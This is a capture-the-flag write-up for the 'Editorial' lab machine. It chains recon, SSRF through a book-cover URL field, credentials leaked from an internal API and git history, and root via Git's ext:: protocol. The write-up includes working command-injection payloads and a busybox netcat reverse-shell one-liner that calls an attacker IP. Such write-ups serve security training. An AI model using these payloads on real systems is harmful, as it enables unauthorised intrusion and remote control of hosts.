# Editorial - Easy

```sh
sudo vim /etc/hosts
# add editorial.htb

nmap -T4 -p- -A -Pn -v editorial.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.7
    * 80/tcp - http - nginx 1.18.0

* the webpage on port 80 is titled 'Editorial Tiempo Arriba' and seems to be a webpage about books

* web scan:

    ```sh
    gobuster dir -u http://editorial.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 25
    # dir scan

    ffuf -c -u 'http://editorial.htb' -H 'Host: FUZZ.editorial.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 178 -s
    # subdomain scan
    ```

* the webpage has links to /about and /upload pages - we can check these

* the /about page includes a contact email id 'submissions@tiempoarriba.htb' - we can update this subdomain in ```/etc/hosts```

* navigating to 'http://tiempoarriba.htb' redirects to 'http://editorial.htb' so we can check this later

* checking the /upload page, it has a feature to upload book information and accepts the following inputs:

    * a book cover URL or a file
    * book name
    * book info
    * why this publisher was chosen
    * contact email
    * contact phone

* checking the source code for /upload includes a script section containing this code:

    ```js
    document.getElementById('button-cover').addEventListener('click', function(e) {
    e.preventDefault();
    var formData = new FormData(document.getElementById('form-cover'));
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/upload-cover');
    xhr.onload = function() {
        if (xhr.status === 200) {
        var imgUrl = xhr.responseText;
        console.log(imgUrl);
        document.getElementById('bookcover').src = imgUrl;
        document.getElementById('bookfile').value = '';
        document.getElementById('bookurl').value = '';
        }
    };
    xhr.send(formData);
    });
    ```

    * the script uses ```XMLHttpRequest``` object to get the book cover data

    * once the book cover data is updated, the other fields are prepared for input

* we can intercept a valid request in Burp Suite, and send to Repeater, and test the fields for any forms of injection or malicious upload:

    * if we upload a book cover image, and click on Preview, it sends a POST request to /upload-cover with the image file; this is a followed by a GET request to /static/uploads/<random-id>, where the book cover is probably uploaded - but the preview does not work

    * for the other form data, only the contact email is checked for a valid data type, and the other fields accept any data

    * for the cover URL field, we can test by hosting an image file on our machine using ```python3 -m http.server```, and submit the URL as 'http://10.10.14.28:8000/default.jpg', for example

    * after entering the URL, if we click on Preview, it does a POST request to /upload-cover with the image URL this time followed by a GET request to /static/uploads/<random-id>, and the image is fetched from our server and the preview works

    * while the image cannot be viewed in /static/uploads as we get 404 error, we can assume there is some kind of processing being done on the image after the POST request to /upload-cover

    * additionally, once the book info is submitted, the footer confirms the book will be read by the team

    * if we try submitting a URL like 'http://127.0.0.1:80/static/images/<image-on-website>', the upload times out and the preview does not load

    * if we try a URL like 'http://127.0.0.1:80', the preview loads for a long time before timing out; if we try any other port number it fails immediately

* as the webpage server is able to make HTTP requests to our machine as well as itself, via the /upload-cover endpoint, we can attempt SSRF attacks - as the URL could be processed without validation

* we can try [local port enumeration using SSRF](https://exploit-notes.hdks.org/exploit/web/ssrf/#http-http):

    * in Burp Suite, capture the POST request to /upload-cover, and copy to file - this will be used for fuzzing

    * to fuzz the requests with a raw request file using ```ffuf```, we need to edit the request file and mark the part to be fuzzed with 'FUZZ' - we can do so for the port number to be enumerated:

        ```sh
        vim test.req
        # edit the request text
        ```

        ```js
        POST /upload-cover HTTP/1.1
        Host: editorial.htb
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
        Accept: */*
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate, br
        Content-Type: multipart/form-data; boundary=---------------------------3063258191300112772089757932
        Content-Length: 355
        Origin: http://editorial.htb
        Connection: keep-alive
        Referer: http://editorial.htb/upload
        Priority: u=0

        -----------------------------3063258191300112772089757932
        Content-Disposition: form-data; name="bookurl"

        http://127.0.0.1:FUZZ
        -----------------------------3063258191300112772089757932
        Content-Disposition: form-data; name="bookfile"; filename=""
        Content-Type: application/octet-stream


        -----------------------------3063258191300112772089757932--

        ```
    
    * now we can fuzz for local port enumeration and try to check if there any other ports listening internally:

        ```sh
        for i in {1..65535};do echo $i >> ports.txt;done
        # create list of ports

        ffuf -u 'http://editorial.htb/upload-cover' -request test.req -w ports.txt
        # we need to do a time-based filter
        ```
    
    * we can see that most of the ports, including the ones which are not running an internal service, respond within 400-500 ms; while port 80, for example, takes a lot of time, and is running a service

    * we can filter out the ports that take too much time via ```-ft``` for filtering based on time, or ```-ac``` (auto-calibration) that can filter out false positives:

        ```sh
        ffuf -u 'http://editorial.htb/upload-cover' -request test.req -w ports.txt -ac
        ```

* using ```ffuf```, we are able to filter out port 5000

* we can try submitting the URL as 'http://127.0.0.1:5000' - the POST call to /upload-cover leads to a GET request to /static/uploads/<random-id>

* once the preview is done, if we click on 'open image in new tab' in the browser, this downloads a file

* this file contains JSON data - this includes API endpoints on port 5000 that we can probe; we can prettify the output using ```jq```:

    ```json
    {
    "messages": [
        {
        "promotions": {
            "description": "Retrieve a list of all the promotions in our library.",
            "endpoint": "/api/latest/metadata/messages/promos",
            "methods": "GET"
        }
        },
        {
        "coupons": {
            "description": "Retrieve the list of coupons to use in our library.",
            "endpoint": "/api/latest/metadata/messages/coupons",
            "methods": "GET"
        }
        },
        {
        "new_authors": {
            "description": "Retrieve the welcome message sended to our new authors.",
            "endpoint": "/api/latest/metadata/messages/authors",
            "methods": "GET"
        }
        },
        {
        "platform_use": {
            "description": "Retrieve examples of how to use the platform.",
            "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
            "methods": "GET"
        }
        }
    ],
    "version": [
        {
        "changelog": {
            "description": "Retrieve a list of all the versions and updates of the api.",
            "endpoint": "/api/latest/metadata/changelog",
            "methods": "GET"
        }
        },
        {
        "latest": {
            "description": "Retrieve the last version of api.",
            "endpoint": "/api/latest/metadata",
            "methods": "GET"
        }
        }
    ]
    }
    ```

* the API endpoint ```/api/latest/metadata/messages/authors``` seems interesting as it mentions a welcome message sent to new authors - we can check this further:

    * submit the cover URL as 'http://127.0.0.1:5000/api/latest/metadata/messages/authors'

    * once the preview is submitted and the image is returned, right-click on the image icon and open in a new tab - this saves a file

    * if we check the downloaded file, it gives us login creds 'dev:dev080217_devAPI!@'

* we can attempt to SSH as 'dev' using these creds:

    ```sh
    ssh dev@editorial.htb
    # this works

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # not available for 'dev'

    # there is another folder here
    ls -la apps
    # this has a .git folder

    cd apps/.git

    which git
    # available

    git log
    # there are 5 commits, check the commits

    # one of the commit messages mentions 'downgrading prod to dev'

    git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
    # this commit discloses creds 'prod:080217_Producti0n_2023!@'

    ls -la /home
    # there is another user 'prod'
    ```

* the Git commits disclose cleartext creds 'prod:080217_Producti0n_2023!@', and we have a user 'prod' on the box, so we can SSH as 'prod' now:

    ```sh
    ssh prod@editorial.htb
    # this works

    sudo -l
    ```

* ```sudo -l``` shows that 'prod' can run the command ```/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *``` as root user - we can check this script further and try to abuse it:

    ```sh
    ls -la /opt/internal_apps/clone_changes/

    cat /opt/internal_apps/clone_changes/clone_prod_change.py
    ```

    ```py
    #!/usr/bin/python3

    import os
    import sys
    from git import Repo

    os.chdir('/opt/internal_apps/clone_changes')

    url_to_clone = sys.argv[1]

    r = Repo.init('', bare=True)
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
    ```

    * the Python script changes the directory to ```/opt/internal_apps/clone_changes```, takes an argument for the URL to clone

    * then it creates a bare repo in this directory, and clones the repo specified by the URL, and names it as 'new_changes'

    * the ```protocol.ext.allow=always``` is to explicitly allow Git's ```ext``` protocol

* Googling about the ```ext``` protocol shows that it is [an unsafe mechanism as it can be used for command execution](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858) with a URL like ```ext::sh -c touch% /tmp/pwned```

* as the script can take any argument, we can use this PoC to get root:

    ```sh
    sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'
    # the script fails, but we can check if the file is created

    ls -la /tmp
    # the 'pwned' file is created and owned by root

    # on attacker, setup listener
    nc -nvlp 5555

    # run the script with reverse shell one-liner
    sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c busybox% nc% 10.10.14.28% 5555% -e% sh'

    # we get root shell
    cat /root/root.txt
    # root flag
    ```
